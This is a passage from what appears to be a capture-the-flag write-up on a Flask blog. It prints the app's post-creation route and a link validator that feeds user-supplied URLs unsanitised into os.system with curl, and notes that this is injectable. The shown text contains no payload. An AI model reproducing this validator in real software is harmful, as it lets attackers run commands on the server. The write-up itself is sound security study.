Because `post.title` is referenced and loaded as `{{ post.title }}`, the text sent is in just inserted here as part of the `rendor`, and therefore, it isn’t passed to `rendor` and not executed.

### Command Injection

I suspected that the command injection was in some kind of link validation script, and that was correct. The routes for handling a submitted post are in `/home/web/blog/flaskblog/posts/routes.py`, and include this:

```

@posts.route("/post/new", methods=['GET', 'POST']) 
@login_required                    
def new_post():
    form = PostForm()
    if form.validate_on_submit():
        post = Post(title=form.title.data, content=form.content.data, author=current_user)
        db.session.add(post)
        db.session.commit()
        flash('Your post has been created!', 'success')
        return redirect(url_for('main.home'))
    return render_template('create_post.html', title='New Post',
                           form=form, legend='New Post')

```

The `PostForm` object is used to validate the submission, and is defined in `/home/web/blog/flaskblog/posts/forms.py`:

```

class PostForm(FlaskForm):
    class Meta:
       csrf = False
    title = StringField('Title', validators=[DataRequired()])
    content = TextAreaField('Content', validators=[DataRequired()])
    submit = SubmitField('Post')

    def validate_content(self, form):
        text = form.data
        urls = re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', text)
        for url in urls:
            url = urls[0]
            random_hex = secrets.token_hex(8)
            path = f'{current_app.root_path}/tmp/blacklist/{random_hex}'
            os.system(f'/bin/curl --max-time 2 {url} -o {path}')
            try:
                with open(path, 'r') as f:
                    content = f.read()
                    for keyword in blacklist:
                        if keyword in text:
                            raise ValidationError('A link you posted lead to a site with blacklisted content!')
            except FileNotFoundError:
                raise ValidationError('A link you posted was not valid!')

```

The `validate_content` function checks for any urls in the content, and then runs `os.system` with `curl` to try to connect to them. That’s what I’m able to inject into. The reason I can’t have spaces in the url is that it won’t match on the regex.